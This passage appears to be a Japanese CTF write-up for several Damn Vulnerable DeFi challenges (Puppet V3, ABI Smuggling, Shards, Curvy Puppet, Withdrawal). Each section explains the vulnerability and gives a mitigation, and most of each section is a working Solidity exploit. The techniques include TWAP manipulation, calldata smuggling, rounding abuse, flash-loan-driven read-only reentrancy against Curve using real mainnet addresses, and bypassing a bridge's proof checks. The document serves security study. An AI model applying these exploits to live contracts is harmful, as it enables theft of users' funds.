        bytes memory setupCalldata = _buildSetup(user);
        uint256 nonce = findNonce(walletDeployer, setupCalldata);

        // 3. drop()を呼ぶ — `user`をownerとするSafeをUSER_DEPOSIT_ADDRESSにデプロイし、
        //    このコントラクト(msg.sender)に1 DVTを支払わせる
        WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, setupCalldata, nonce);

        // 4. Safeから資金を引き出す
        _drainSafe(token, user, userPrivateKey);

        // 5. 報酬を転送する
        IERC20(token).transfer(ward, IERC20(token).balanceOf(address(this)));
    }

    // needsInitはproxyのupgraderアドレス(非ゼロ)を読んでしまうため、init()のrequireが再び通ってしまう
    function getAuthorized(address authorizer) internal {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerUpgradeable(authorizer).init(wards, aims);
    }

    function _buildSetup(address user) internal pure returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = user;
        return abi.encodeCall(
            Safe.setup, (owners, 1, address(0), bytes(""), address(0), address(0), 0, payable(address(0)))
        );
    }

    // SafeProxyFactory.createProxyWithNonce()がUSER_DEPOSIT_ADDRESSへデプロイするnonceをbrute-forcedで探す
    function findNonce(address walletDeployer, bytes memory setupCalldata) internal view returns (uint256) {
        WalletDeployer wd = WalletDeployer(walletDeployer);
        bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(wd.cpy()))));
        bytes32 initializerHash = keccak256(setupCalldata);
        address factory = address(wd.cook());
        for (uint256 n = 0; n < 1000; n++) {
            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xff), factory, keccak256(abi.encodePacked(initializerHash, n)), initCodeHash
            )))));
            if (predicted == USER_DEPOSIT_ADDRESS) {
                console.log("found nonce:", n);
                return n;
            }
        }
        revert("nonce not found in 0..999");
    }

    function _drainSafe(address token, address user, uint256 userPrivateKey) internal {
        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
        bytes memory transferCalldata = abi.encodeCall(
            IERC20.transfer, (user, IERC20(token).balanceOf(USER_DEPOSIT_ADDRESS))
        );
        bytes32 txHash = safe.getTransactionHash(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), address(0), 0
        );
        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(userPrivateKey, txHash);
        safe.execTransaction(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)),
            abi.encodePacked(r, s, v)
        );
    }
}
```

## 14. Puppet V3
Uniswap V3の10分間TWAPでWETH担保の価格を取るDVTレンディングプール。流動性の低いプールでのTWAP操作に弱い。
### 目標 :
- レンディングプールから100万DVTを全額recoveryへ移す。
### 制約 :
- セットアップ後115秒未満で完了する。
### 脆弱性 :
- プールはわずか10分間のTWAP(時間加重平均価格)を使い、しかもUniswap V3の流動性が小さい(100 DVT / 100 WETH)。十分大きなスワップを約2分維持するだけで平均が大きく動く。
### 攻撃手順 :
- プレイヤーの110 DVTを`exactInputSingle`でUniswap V3に売って価格を暴落させ、`vm.warp`で114秒(制限ギリギリ)進めてTWAPを暴落後の価格に近づける。`calculateDepositOfWETHRequired`が十分安くなり、プレイヤーのWETHで100万DVTを借りてrecoveryへ送る。
### 対策 :
- TWAPの時間幅を長くする(および/または2つ目のoracleを使う)。これで1ブロックの短時間の価格操作では平均が十分に動かず、担保の見積もりを欺けなくなる。
### POC
```solidity
function test_puppetV3() public checkSolvedByPlayer {
    address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    token.approve(address(uniswapRouterAddress), type(uint256).max);
    // 攻撃前のquote(比較用。まだ操作されていない正しい価格)
    uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    console.log("quote1: ", quote1);

    // プレイヤーのDVTをすべてpoolへ売ってDVT/WETH価格を暴落させる
    ISwapRouter(uniswapRouterAddress).exactInputSingle(
        ISwapRouter.ExactInputSingleParams(
            address(token),
            address(weth),
            3000,
            address(player),
            block.timestamp,
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,
            0
        )
    );
    // TWAPが暴落後の価格に十分に近づくまで時間を経過させる
    vm.warp(block.timestamp + 114);
    // 安くなったquoteを再取得する
    uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    weth.approve(address(lendingPool), quote);
    console.log("quote: ", quote);
    // 本来かかるはずよりずっと少ないWETH担保で100万DVTを借りてrecoveryに送る
    lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
}
```

## 15. ABI Smuggling
呼び出し元ごとに、`execute`経由で実行できる関数セレクタが制限されている権限付きVault。calldataの偽装（smuggling）に弱い。
### 目標 :
- vaultから100万DVTを全額recoveryへ移す。
### 脆弱性 :
- `execute()`はcalldataの固定位置(100バイト目)から読み取ったselectorで権限チェックを行い、`actionData`のoffsetが実際に指す位置は見ていない。そのためチェックされるselectorと実行される呼び出しを別物にできる。
### 攻撃手順 :
- calldataを手動で組み立てる:プレイヤーが呼び出し許可を持つ`withdraw`のselectorを100バイト目にダミーとして置き、`actionData`のoffsetはさらに先の`sweepFunds(recovery, token)`呼び出し(プレイヤーに権限なし)を指すようにする。チェックはダミーで通過するが、vaultは`sweepFunds`を実行する。
### 対策 :
- `actionData`を実際に実行されるとおりにデコードし、その本物のpayloadのselectorをチェックする。権限チェック用のselectorをcalldataの固定offsetから読まない。
### POC
```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    Exploit exploit = new Exploit(address(vault), address(token), recovery);
    bytes memory payload = exploit.executeExploit();
    address(vault).call(payload);
}

contract Exploit {
    SelfAuthorizedVault public vault;
    IERC20 public token;
    address public player;
    address public recovery;

    constructor(address _vault, address _token, address _recovery) {
        vault = SelfAuthorizedVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
        player = msg.sender;
    }

    function executeExploit() external returns (bytes memory) {

        // `execute()`のfunction selector
        bytes4 executeSelector = vault.execute.selector;

        // 対象コントラクトのアドレス(vaultのアドレス)を32バイトにpaddingして組み立てる
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));

        // calldataの開始位置を示すoffsetを組み立てる
        bytes memory dataOffset = abi.encodePacked(uint256(0x80)); // action dataの開始位置へのoffset

        // 空のdata filler(32バイトのゼロ)を組み立てる
        bytes memory emptyData = abi.encodePacked(uint256(0));

        // `withdraw()`のselector `d9caed12` を手動で指定し、残りをゼロで埋める
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),     // withdrawのfunction selector
            bytes28(0)              // 32バイトのslotを埋めるための28バイトのゼロ
        );

        // `sweepFunds()`関数のcalldataを組み立てる
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        // actionDataLengthを手動で0x44(68バイト)に設定する
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));

        // すべての要素を組み合わせて完全なcalldata payloadを作る
        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,              // 4バイト
            target,                       // 32バイト
            dataOffset,                   // 32バイト
            emptyData,                    // 32バイト
            withdrawSelectorPadded,       // 32バイト(100バイト目から開始)
            actionDataLength,             // actionDataの長さ
            sweepFundsCalldata            // `sweepFunds()`への実際のcalldata
        );

        // 組み立てたcalldata payloadを返す
        return calldataPayload;
    }
}
```

## 16. Shards
NFTの分割持分（shards）をDVTで売買するマーケットプレイス。支払い額と返金額の計算で丸め処理に一貫性がないため、脆弱性が生じている。
### 目標 :
- marketplaceからDVT(0.01%超)を取り、全額recoveryへ送る。
### 制約 :
- stakingコントラクトの残高は変えてはいけない。
- 1トランザクションで完了する。
### 脆弱性 :
- `fill()`の支払額は`want * _toDVT(price, rate) / totalShards`で切り捨て計算されるため、100 shardsを買うと0 DVTになる(100 * 75e21 / 1e25 = 0.75 → 0)。
- `cancel()`は別の計算式`shards * rate / 1e6`(切り上げ)で返金するため、同じ100 shardsで約7.5e12 wei のDVTが返ってくる。
- `cancel()`の時間チェックが逆に書かれているため、購入と同じブロックで即キャンセルできる。
### 攻撃手順 :
- 1トランザクションに収めるため、exploitコントラクト内で100 shardsのfill → cancelを10001回繰り返し、利益をrecoveryへ送る。
### 対策 :
- 常にprotocolに有利な一貫した丸め方を使う(請求は切り上げ、返金は切り捨て)。コスト0のfillは拒否し、`cancel()`の逆になっている時間チェックを修正する。
### POC
```solidity
function test_shards() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(marketplace,token,recovery);
        exploit.attack(1);
        console.log("recovery balance",token.balanceOf(address(recovery)));
    }

contract Exploit {
    ShardsNFTMarketplace public marketplace;
    DamnValuableToken public token;
    address recovery;

    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
        marketplace = _marketplace;
        token = _token;
        recovery = _recovery;
    }

    function attack(uint64 offerId) external {
        uint256 wantShards = 100; // 1回の呼び出しで100 shardsをfillする

        // fill(1, 100)を10001回繰り返す
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1,i);
        }

        token.transfer(recovery,token.balanceOf(address(this)));
    }
}
```

## 17. Curvy Puppet
DVTを担保にCurve stETH/ETHのLPトークンを借りられるlendingコントラクト。Curveの`get_virtual_price()`に対するread-only reentrancyに弱い。
### 目標 :
- lendingコントラクト内の3ユーザー(alice/bob/charlie)のポジションをすべて閉じる(collateralもborrowも0にする)。
### 制約 :
- treasuryはWETHとLPをいくらか残し、3ユーザー分のDVT(7500)を最終的に持つこと。
- playerは最終的に何も残してはいけない。
### 脆弱性 :
- lendingコントラクトは借入資(Curve stETH/ETHのLPトークン)を`ETH_price * get_virtual_price()`で評価する。旧Curveプールの`remove_liquidity`はまずLP供給量をburnし、その後プール残高が確定する前に呼び出し元へraw callでETHを送り返すため、そのETHコールバック中に`get_virtual_price()`が過大な値を読み取る(read-only reentrancy:コントラクトの状態が更新途中のときにview関数へ再入すること)。
- LPトークンはユーザーの借入資なので、膨らんだLP価格が全員の負債価値を膨らませ、本来は過剰担保だった3つのポジションが清算可能になる。
- 清算は`collateralValue*100 < borrowValue*175`で発動する。collateral = 2500 DVT($10)、borrow = 1 LP(25000 * 100 < 4000 * vp * 175)なので、`virtual_price > 3.5714e18`まで押し上げる必要がある。
### 攻撃手順 :
- Balancer(外側・手数料0)とAave(内側)からWETH+wstETHをフラッシュローン → unwrap/withdrawでETH+stETHに変換 → 意図的にstETHを多めにした巨大な`add_liquidity`を実行する。`remove_liquidity`を呼ぶとread-only reentrancyが起き、virtual_priceが急上昇する。そのコールバック中に3ユーザーすべてを`liquidate()`する(1人あたり1 LPを払い、2500 DVTをもらう)。
- 返済: ETH余剰分をstETHに変換(Lido経由)してwstETHへwrapし、Aave + Balancerの負債を賄う。Aaveの約0.05%の手数料はtreasuryのWETHので賄える。
### 対策 :
- 信頼できない呼び出し元へ制御が渡り得る状態で`get_virtual_price()`(やpoolのstate)を読まない。操作されにくいoracleを使うか、viewにもpoolのreentrancy lockを付ける。また、貸付資産を単一時点のspot virtual priceだけで評価しない。
### POC
```solidity
function test_curvyPuppet() public checkSolvedByPlayer {
    // treasuryの資金をexploitコントラクトへ移す
    // treasuryはsetUpで`player`をapproveしたので、ここではplayerとして実行する
    Exploit exploit = new Exploit(
        lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
    );
    weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
    IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);

    // flash loan → add_liquidity → remove_liquidity(reentrancy) → liquidateの一連の流れを開始する
    exploit.run();
}

// `https://github.com/balancer/balancer-v2-monorepo/blob/master/pkg/interfaces/contracts/vault/IVault.sol` から
interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

// `https://github.com/lidofinance/core/blob/master/contracts/0.6.12/WstETH.sol` から
interface IWstETH {
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Exploit {
    // mainnetのアドレス
    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant aavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2; // Aave V3 Pool
    IWstETH constant wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    // flash loanの量(それぞれ貸し手の保有量を超えてはいけない)
    // Balancerの保有量 <= 約37,991 WETH / 約12,597 wstETH
    uint256 constant BAL_WETH   = 37_000e18;
    uint256 constant BAL_WSTETH = 12_000e18;
    // Aaveの保有量 <= 約83,192 WETH / 約1,036,780 wstETH
    // reentrancyによる`virtual_price`の上昇幅はstETHの預入量に応じて大きくなるため、ETHよりもstETHを多く預ける
    // wstETHの量は、`virtual_price`が清算しきい値（約3.5714e18）をわずかに上回るように調整している。
    // wstETHを多く借りるほどAaveの手数料も増え、treasuryに残る資金は少なくなる
    uint256 constant AAVE_WETH   = 83_000e18;
    uint256 constant AAVE_WSTETH = 140_000e18;
    // treasuryが最終的にWETH > 0で終われるよう残しておくETH
    uint256 constant ETH_RESERVE = 20e18;

    CurvyPuppetLending immutable lending;
    IStableSwap immutable curvePool;
    CurvyPuppetOracle immutable oracle;
    DamnValuableToken immutable dvt;
    IERC20 immutable stETH;
    WETH immutable weth;
    address immutable treasury;
    address immutable lpToken;
    address[3] users;

    // 今が清算時間の中かどうかのflag。receive()がliquidate()を呼んでよいタイミングを判断するために使う
    enum State { NONE, LIQUIDATING }
    State state;

    constructor(
        CurvyPuppetLending _lending,
        IStableSwap _curvePool,
        CurvyPuppetOracle _oracle,
        DamnValuableToken _dvt,
        IERC20 _stETH,
        WETH _weth,
        address _treasury,
        address[3] memory _users
    ) {
        lending = _lending;
        curvePool = _curvePool;
        oracle = _oracle;
        dvt = _dvt;
        stETH = _stETH;
        weth = _weth;
        treasury = _treasury;
        users = _users;
        lpToken = _curvePool.lp_token();
    }

    function run() external {
        // 外側のローン(最初に呼び、最後に返済する)。Balancerは手数料なし
        // tokenはアドレスの昇順で渡す必要がある: wstETH (0x7f39..) < WETH (0xC02a..)
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        tokens[0] = address(wstETH);
        tokens[1] = address(weth);
        amounts[0] = BAL_WSTETH;
        amounts[1] = BAL_WETH;
        balancer.flashLoan(address(this), tokens, amounts, "");

        // 残った資産をtreasuryへ返す
        weth.deposit{value: address(this).balance}();
        dvt.transfer(treasury, dvt.balanceOf(address(this)));            // 7500 DVT
        weth.transfer(treasury, weth.balanceOf(address(this)));          // WETH > 0
        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this))); // LP > 0
    }

    // Balancerからのコールバック。BAL_WETH + BAL_WSTETHが送られてくる。ここでAaveのローンを内部で実行する
    function receiveFlashLoan(
        address[] memory, // tokens
        uint256[] memory, // amounts
        uint256[] memory, // fees(0)
        bytes memory // userData
    ) external {
        require(msg.sender == address(balancer), "not balancer");

        // 内側のローン(Aave)。Aaveのコールバック(executeOperation)が攻撃本体を実行する
        address[] memory assets = new address[](2);
        uint256[] memory amts = new uint256[](2);
        uint256[] memory modes = new uint256[](2); 
        assets[0] = address(weth);
        assets[1] = address(wstETH);
        amts[0] = AAVE_WETH;
        amts[1] = AAVE_WSTETH;
        (bool ok,) = aavePool.call(
            abi.encodeWithSignature(
                "flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
                address(this), assets, amts, modes, address(this), bytes(""), uint16(0)
            )
        );
        require(ok, "aave flashloan failed");

        // Aaveから戻ってきたのでBalancerへ返済する
        IERC20(address(weth)).transfer(address(balancer), BAL_WETH);
        IERC20(address(wstETH)).transfer(address(balancer), BAL_WSTETH);
    }

    // 内側のcallback。今はBalancerとAaveのtokenを合わせて保有している。ここですべてを行う
    function executeOperation(
        address[] calldata, // assets
        uint256[] calldata, // amounts
        uint256[] calldata fees,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == aavePool, "not aave");
        require(initiator == address(this), "bad initiator");

        // 借りたtokenをすべてpoolのcoin(ETH + stETH)に変換する
        weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));   // WETHをすべてETHへ
        wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this))); // wstETH -> stETH
        stETH.approve(address(curvePool), type(uint256).max);

        // stETH多めの大量の流動性を追加する: coin0 = ETH, coin1 = stETH
        uint256 stEthAmount = stETH.balanceOf(address(this));
        uint256 ethForLp = address(this).balance;
        uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);

        // liquidate()実行時にlendingが自分のLP(borrowAsset)を引き出せるようにしておく
        IERC20(lpToken).approve(address(permit2), type(uint256).max);
        permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));

        // 流動性を引き出す。プールからETHが直接送金され、receive()が呼び出される。その中で清算を実行する。
        state = State.LIQUIDATING;
        curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
        state = State.NONE;

        // 返済処理。流動性の引き出しと清算の後、ETH（余剰分）とstETHが残っている。
        // stETHを多めに預け入れた結果、ETHを多めに回収するため、ETHが余り、wstETHが不足する。
        // 両者の価値はおおむね釣り合っているため、余ったETHをstETHに交換し、
        // wstETHにラップして不足分を補う。
        uint256 wethOwed   = AAVE_WETH + fees[0] + BAL_WETH;
        uint256 wstethOwed = AAVE_WSTETH + fees[1] + BAL_WSTETH;

        // まず返済すべきWETH分をぴったり確保する
        weth.deposit{value: wethOwed}();                              // ETHをWETHへ

        // 残りのETHをstETHに変換する(treasuryがWETH > 0で終われるようETH_RESERVEは残す)
        uint256 ethBal = address(this).balance;
        if (ethBal > ETH_RESERVE) {
            (bool ok,) = address(stETH).call{value: ethBal - ETH_RESERVE}(
                abi.encodeWithSignature("submit(address)", address(0))
            );
            require(ok, "lido submit failed");
        }

        // stETHをすべてwrapし、wstETHになる。返済に必要な量を満たす必要がある
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(stETH.balanceOf(address(this)));
        require(IERC20(address(wstETH)).balanceOf(address(this)) >= wstethOwed, "wsteth short");

        // trueを返した時点でAaveがtransferFromで返済分を引き出す
        IERC20(address(weth)).approve(aavePool, AAVE_WETH + fees[0]);
        IERC20(address(wstETH)).approve(aavePool, AAVE_WSTETH + fees[1]);
        return true;
    }

    // remove_liquidity中にCurveプールがここにETHを送ってくる(read-only reentrancyの窓)
    receive() external payable {
        if (state != State.LIQUIDATING) return;
        // 今まさにvirtual_priceが膨張しているので、すべてのborrowポジションが清算可能
        for (uint256 i = 0; i < users.length; i++) {
            lending.liquidate(users[i]);
        }
    }
}
```

## 18. Withdrawal
L2のログをmerkle proofsで検証し、L1で出金を確定するL2→L1トークンブリッジ。operatorが証明検証を回避でき、外部呼び出しの失敗も無視される。
### 目標 :
- 与えられた4つのwithdrawal(怪しいものも含む)をすべてL1 gatewayでfinalizeする。
### 制約 :
- token bridgeはいくらか資金を失うが、損失は1%未満に抑える。
- playerは最終的にtokenを0にする。
### 脆弱性 :
- `L1Gateway.finalizeWithdrawal()`は`OPERATOR_ROLE`を持つ者(player)なら空のMerkle proofでwithdrawalをfinalizeできる。
- 外部呼び出しの前にleafをfinalizedと記録してcounterを増やし、その呼び出しの成否を無視する。そのためtoken送金が失敗してもwithdrawalは「finalize」される。
- 4つのwithdrawalのうち3つは正当な10 DVTの送金で、1つ(index 2)が悪意あるもので999,000 DVTを引き出してbridgeを空にする。
### 攻撃手順 :
- 7日の遅延期間はoperatorにも適用されるので`vm.warp`で飛ばす。その後operatorとして、`withdrawals.json`のpayloadをそのまま実行する。 正当な3つをfinalizeし、自作のwithdrawalをfinalizeして999,000 DVTをplayerへ引き出してbridgeを空にしておき、悪意あるものをfinalizeする(ここで`TokenBridge.executeTokenWithdrawal`が`totalDeposits -= 999_000e18`を行い、underflowしてrevertするため、leafは記録されるがtokenは動かない)、最後に999,000 DVTをbridgeへ返す(playerは0になる)。
### 対策 :
- 特権ロールがproof検証を回避できないようにし、finalized扱いにする前にmessageが実際に成功したかを確認し(呼び出しの戻り値/revertをチェック)、1つのmessageでbridgeを空にできないようwithdrawalごとの金額上限を設ける。
### POC
```solidity
function test_withdrawal() public checkSolvedByPlayer {
    // 7日の遅延期間をvm.warpで飛ばす
    vm.warp(block.timestamp + l1Gateway.DELAY() + 1 days);

    bytes32[] memory noProof = new bytes32[](0);
    string memory logs = vm.readFile("test/withdrawal/withdrawals.json");

    // 正当な3つのwithdrawalをfinalize(index 0,1,3、各10 DVT)
    uint256[3] memory legit = [uint256(0), 1, 3];
    for (uint256 j = 0; j < legit.length; j++) {
        (, uint256 timestamp, bytes memory message) = abi.decode(
            vm.parseJsonBytes(logs, string.concat("[", vm.toString(legit[j]), "].data")),
            (bytes32, uint256, bytes)
        );
        l1Gateway.finalizeWithdrawal(
            uint256(vm.parseJsonBytes32(logs, string.concat("[", vm.toString(legit[j]), "].topics[1]"))),
            l2Handler,
            address(l1Forwarder),
            timestamp,
            message,
            noProof
        );
    }

    // 悪意あるwithdrawal(index 2)は999,000 DVTを引き出してbridgeを空にしてしまう。
    // そこで先に自作のwithdrawalでbridgeの資金をplayerへ移しておく。
    // これにより本物のindex 2をfinalizeするとき`totalDeposits -= 999_000e18`がunderflowしてrevertする。
    // finalizeWithdrawalは外部呼び出しの前にleafを記録し、その成否を無視するのでfinalized扱いは残る。
    uint256 drain = 999_000e18;
    bytes memory inner = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", player, drain);
    bytes memory fwd = abi.encodeWithSignature(
        "forwardMessage(uint256,address,address,bytes)", uint256(1000), player, address(l1TokenBridge), inner
    );
    // l2Sender = l2Handlerなので、L1ForwarderのxSender検証を通過する
    l1Gateway.finalizeWithdrawal(1000, l2Handler, address(l1Forwarder), START_TIMESTAMP, fwd, noProof);

    // 悪意あるwithdrawal(index 2)をfinalize。内部の送金はunderflowで失敗するが、finalized済みとして記録される。
    {
        (, uint256 timestamp, bytes memory message) =
            abi.decode(vm.parseJsonBytes(logs, "[2].data"), (bytes32, uint256, bytes));
        l1Gateway.finalizeWithdrawal(
            uint256(vm.parseJsonBytes32(logs, "[2].topics[1]")),
            l2Handler,
            address(l1Forwarder),
            timestamp,
            message,
            noProof
        );
    }

    // 一時的に抜いたtokenをbridgeへ返す(playerは最終的に0になる)
    token.transfer(address(l1TokenBridge), drain);
}
```
